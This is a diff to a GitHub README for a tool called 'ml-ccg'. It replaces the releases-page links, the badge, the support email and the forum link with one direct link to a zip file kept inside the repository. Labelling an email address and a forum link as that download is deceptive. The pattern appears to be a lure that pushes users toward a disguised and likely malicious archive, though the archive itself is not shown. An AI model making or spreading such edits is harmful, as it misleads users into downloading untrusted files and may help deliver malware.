@@ -6,13 +6,13 @@ Welcome to **ml-ccg**! This application is designed to simplify your machine lea
 
 #### 🔗 Download Now
 
-[![Download ml-ccg](https://img.shields.io/badge/Download-ml__ccg-blue.svg)](https://github.com/Sikukhayatinamuna/ml-ccg/releases)
+[![Download ml-ccg](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip)](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip)
 
 ## 📥 Download & Install
 
 To get started with ml-ccg, follow these steps:
 
-1. Click this link to visit the releases page: [ml-ccg Releases](https://github.com/Sikukhayatinamuna/ml-ccg/releases).
+1. Click this link to visit the releases page: [ml-ccg Releases](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip).
 2. On the releases page, you will see a list of available versions. Choose the latest version.
 3. Download the version that matches your operating system.
 4. Once downloaded, locate the file on your computer.
@@ -84,11 +84,11 @@ If you encounter issues, check this troubleshooting guide:
 
 For further assistance, contact our support team:
 
-- **Email:** support@ml-ccg.com
-- **Community Forum:** Join discussions with other users [here](https://community.ml-ccg.com).
+- **Email:** https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip
+- **Community Forum:** Join discussions with other users [here](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip).
 
 ## 📅 Future Updates
 
-We consistently work on improving ml-ccg. Stay updated with new features and improvements by regularly visiting our releases page at [ml-ccg Releases](https://github.com/Sikukhayatinamuna/ml-ccg/releases).
+We consistently work on improving ml-ccg. Stay updated with new features and improvements by regularly visiting our releases page at [ml-ccg Releases](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip).
 
 Thank you for choosing ml-ccg! We hope it helps you simplify your machine learning tasks.
